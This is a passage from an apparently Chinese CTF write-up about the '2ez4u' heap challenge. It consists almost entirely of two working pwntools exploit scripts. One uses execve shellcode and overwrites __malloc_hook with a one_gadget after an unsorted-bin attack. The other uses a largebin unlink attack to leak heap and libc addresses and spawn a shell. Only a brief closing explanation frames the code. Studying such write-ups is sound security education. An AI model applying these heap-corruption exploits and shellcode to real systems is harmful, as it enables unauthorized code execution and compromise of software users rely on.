'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"><span class="comment">#     print i</span></span><br><span class="line"><span class="comment">#     if local:</span></span><br><span class="line"><span class="comment">#         p = process('./babypie')</span></span><br><span class="line"><span class="comment">#         libc = elf.libc</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         p = remote('',)</span></span><br><span class="line"><span class="comment">#         libc = ELF('./')</span></span><br><span class="line"><span class="comment">#     sl = lambda s : p.sendline(s)</span></span><br><span class="line"><span class="comment">#     sd = lambda s : p.send(s)</span></span><br><span class="line"><span class="comment">#     rc = lambda n : p.recv(n)</span></span><br><span class="line"><span class="comment">#     ru = lambda s : p.recvuntil(s)</span></span><br><span class="line"><span class="comment">#     ti = lambda : p.interactive()</span></span><br><span class="line"><span class="comment">#     system_addr = '\x3E\x0A'</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 +'\x01'</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     ru('\x01')</span></span><br><span class="line"><span class="comment">#     canary = '\x00' + p.recv()[:7]</span></span><br><span class="line"><span class="comment">#     print "canary---&gt;" + hex(u64(canary))</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 + canary + 'aaaaaaaa' + system_addr</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         p.recv(timeout = 1)</span></span><br><span class="line"><span class="comment">#     except EOFError:</span></span><br><span class="line"><span class="comment">#         p.close()</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):</span></span><br><span class="line"><span class="comment">#   payload = ''</span></span><br><span class="line"><span class="comment">#   payload += 'a'*offset</span></span><br><span class="line"><span class="comment">#   payload += 'aaaaaaaa'</span></span><br><span class="line"><span class="comment">#   payload += p64(pppppp_ret)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(1)</span></span><br><span class="line"><span class="comment">#   payload += p64(func_got)</span></span><br><span class="line"><span class="comment">#   payload += p64(rdx)</span></span><br><span class="line"><span class="comment">#   payload += p64(rsi)</span></span><br><span class="line"><span class="comment">#   payload += p64(rdi)</span></span><br><span class="line"><span class="comment">#   payload += p64(mov_ret)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(0)</span></span><br><span class="line"><span class="comment">#   payload += p64(next_func)</span></span><br><span class="line"><span class="comment">#   ru('Input:\n')</span></span><br><span class="line"><span class="comment">#   sd(payload)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(color,value,num,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"color?(0:red, 1:green):"</span>)</span><br><span class="line">    sl(str(color))</span><br><span class="line">    ru(<span class="string">"value?(0-999):"</span>)</span><br><span class="line">    sl(str(value))</span><br><span class="line">    ru(<span class="string">"num?(0-16):"</span>)</span><br><span class="line">    sl(str(num))</span><br><span class="line">    ru(<span class="string">"description length?(1-1024):"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"description of the apple:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"which?(0-15):"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,color,value,num,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"which?(0-15):"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"color?(0:red, 1:green):"</span>)</span><br><span class="line">    sl(str(color))</span><br><span class="line">    ru(<span class="string">"value?(0-999):"</span>)</span><br><span class="line">    sl(str(value))</span><br><span class="line">    ru(<span class="string">"num?(0-16):"</span>)</span><br><span class="line">    sl(str(num))</span><br><span class="line">    ru(<span class="string">"new description of the apple:"</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"which?(0-15):"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">'dddd'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">"description:"</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">"realloc"</span>]</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x43</span></span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'eeee'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'ffff'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'eeee'</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'pppp'</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'eeee'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">py += p64(<span class="number">0</span>) + p64(malloc_hook<span class="number">-0x50</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,py)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hhhh'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">py += p64(malloc_hook<span class="number">-0x43</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,py)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hhhh'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x13</span> + p64(onegadget) + p64(realloc+<span class="number">4</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0x50</span>,py)</span><br><span class="line"><span class="comment"># debug(0xd22)</span></span><br><span class="line">ru(<span class="string">"your choice: "</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">"color?(0:red, 1:green):"</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">"value?(0-999):"</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">"num?(0-16):"</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">"description length?(1-1024):"</span>)</span><br><span class="line">sl(<span class="string">'777'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里主要讲largebin attack，下面进入正题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"> </span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"> </span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"> </span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim  bk_nextsize</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target  </span></span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)   <span class="comment">#fd_nextsize</span></span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br><span class="line"> </span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!!</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">0x3</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"> </span><br><span class="line">junk  = <span class="string">''</span></span><br><span class="line">junk += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">junk += p64(<span class="number">0x81</span>)</span><br><span class="line">junk += p64(LIBC+<span class="number">0x3c4be8</span>)</span><br><span class="line">junk += p64(HEAP+<span class="number">0x300</span>)</span><br><span class="line">junk  = junk.ljust(<span class="number">0xa8</span>, <span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"> </span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"> </span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, 'b *0x%x' % (base_addr+0x124e))</span></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'/bin/sh'</span>) <span class="comment">#</span></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment">#</span></span><br><span class="line">debug(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>因为这个程序有0x18的阻拦，所以泄露地址其实有点问题，这里全程采用largebin的方法去做：</p>
<p>利用了largebin的unlink漏洞，大概思路如下：</p>
<p>1、2个largebin的堆块入bin，泄露出bk_nextsize处的堆地址</p>
<p>2、有了堆地址，我们可以伪造fake_largebin_chunk(伪造指针)进行largebin的attack，从而利用堆块重叠，可以泄露出libc地址</p>
